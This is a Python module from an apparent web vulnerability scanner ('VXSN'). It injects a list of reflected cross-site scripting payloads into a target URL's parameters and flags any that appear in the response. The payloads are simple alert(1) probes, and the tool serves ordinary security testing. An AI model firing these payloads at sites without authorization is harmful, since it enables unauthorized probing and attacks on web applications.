#!/usr/bin/env python3
# modules/xss.py — Cross-Site Scripting scanner for VXSN

import urllib.parse
from modules.base import BaseModule
from utils.colors import Colors, print_status, print_finding, print_section

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "';alert(1)//",
    "</script><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",  # URL-encoded
]

REFLECTION_MARKERS = [
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "onerror=alert(1)",
    "onload=alert(1)",
    "svg onload",
    "javascript:alert",
    "onfocus=alert",
    "ontoggle=alert",
]


class XSSScanner(BaseModule):

    NAME        = "vuln/xss"
    DESCRIPTION = "Cross-Site Scripting — reflected XSS detection via parameter injection"
    SEVERITY    = "HIGH"
    REFERENCES  = [
        "https://owasp.org/www-community/attacks/xss/",
        "https://portswigger.net/web-security/cross-site-scripting",
    ]

    def _define_options(self):
        self._add_option("TARGET",  "",    True,  "Target URL (e.g. https://site.com/search.php?q=test)")
        self._add_option("PARAM",   "",    False, "Specific parameter to test (default: all)")
        self._add_option("METHOD",  "GET", False, "HTTP method: GET or POST")
        self._add_option("TIMEOUT", "10",  False, "Request timeout in seconds")
        self._add_option("DELAY",   "0",   False, "Delay between requests in seconds")

    def run(self) -> list:
        if not self._validate():
            return []

        target = self.get_option("TARGET").strip()
        method = self.get_option("METHOD").upper()
        self.client = self._init_client()

        params = self._extract_params(target)
        if not params:
            print_status("No parameters found. Set PARAM manually or include ?param=value in TARGET.", "warn")
            return []

        specific = self.get_option("PARAM")
        if specific:
            params = {k: v for k, v in params.items() if k == specific}

        print_section(f"XSS Scan — {target}")
        print_status(f"Parameters : {Colors.WHITE}{list(params.keys())}{Colors.RESET}", "info")
        print_status(f"Payloads   : {Colors.WHITE}{len(XSS_PAYLOADS)}{Colors.RESET}", "info")
        print()

        findings = []
        base_url = target.split("?")[0] if "?" in target else target

        for param in params:
            print_status(f"Testing parameter: {Colors.CYAN}{param}{Colors.RESET}", "run")
            for payload in XSS_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload

                if method == "POST":
                    code, body, _ = self.client.post(base_url, data=test_params)
                else:
                    code, body, _ = self.client.get(base_url, params=test_params)

                if code == 0:
                    continue

                body_lower = body.lower()
                for marker in REFLECTION_MARKERS:
                    if marker.lower() in body_lower:
                        # Verify it's actually reflected (not just present in page source)
                        encoded = urllib.parse.quote(payload)
                        if payload.lower() in body_lower or encoded.lower() in body_lower:
                            f = self._finding(
                                "Cross-Site Scripting (Reflected)", target, param, payload,
                                evidence=f"Payload reflected in response body"
                            )
                            print_finding(f["type"], target, param, payload,
                                          f["severity"], f["evidence"])
                            findings.append(f)
                            break  # One finding per param is enough

                if any(f["param"] == param for f in findings):
                    break  # Move to next param once found

        print()
        if findings:
            print_status(f"Found {Colors.RED}{len(findings)}{Colors.RESET} XSS vulnerability(ies).", "ok")
        else:
            print_status("No XSS vulnerabilities detected.", "safe")

        return findings

    def _extract_params(self, url: str) -> dict:
        if "?" in url:
            qs = url.split("?", 1)[1]
            return dict(urllib.parse.parse_qsl(qs))
        return {}
